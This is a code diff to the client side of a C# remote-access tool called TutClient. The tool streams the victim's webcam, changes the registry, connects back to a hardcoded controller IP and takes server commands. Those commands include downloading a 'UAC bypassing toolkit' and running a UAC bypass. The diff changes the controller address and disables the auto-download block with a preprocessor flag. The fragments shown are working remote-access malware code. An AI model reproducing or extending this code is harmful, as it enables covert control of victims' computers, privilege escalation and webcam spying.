@@ -1,4 +1,5 @@
-﻿using AForge.Video; //For webcam streaming
+﻿#undef EnableAutoBypass
+using AForge.Video; //For webcam streaming
 using AForge.Video.DirectShow; //For webcam streaming
 using appCom; //For communication with the proxy server
 using Microsoft.Win32; //For registry operations
@@ -465,7 +466,7 @@ namespace TutClient
                     attempts++; //1 more attempt
                     Console.WriteLine("Connection attempt " + attempts);
 
-                    string connectionString = GetIPAddress("192.168.10.96"); //Replace IP with DNS if you want
+                    string connectionString = GetIPAddress("192.168.10.40"); //Replace IP with DNS if you want
                   
                     _clientSocket.Connect(IPAddress.Parse(connectionString), _PORT); //Try to connect to the server
                     Thread.Sleep(500);
@@ -1433,7 +1434,7 @@ namespace TutClient
                 String app = Application.StartupPath; //Get the startup folder
                 SendCommand("setstart§" + app); //Send it to the server
             }
-
+#if EnableAutoBypass
             if (text == "uacload") //Auto download the UAC bypassing toolkit
             {
                 UAC uac = new UAC(); //Create a new UAC module
@@ -1442,6 +1443,7 @@ namespace TutClient
                     SendCommand("uacload§" + progress.ToString()); //Send the progress to the server
                 }
             }
+#endif
 
             if (text == "uacbypass") //Bypass the UAC
             {
@@ -2315,6 +2317,7 @@ namespace TutClient
             }
         }
 
+#if EnableAutoBypass
         /// <summary>
         /// Auto download the UAC bypass toolkit
         /// </summary>
@@ -2344,6 +2347,7 @@ namespace TutClient
             wc.DownloadFile(unattendFile, Application.StartupPath + "\\unattend.xml"); //Download the unattend file
             yield return 25; //Return a 25% increase in the progress
         }
+#endif
 
         /// <summary>
         /// The methods to use when probing statup
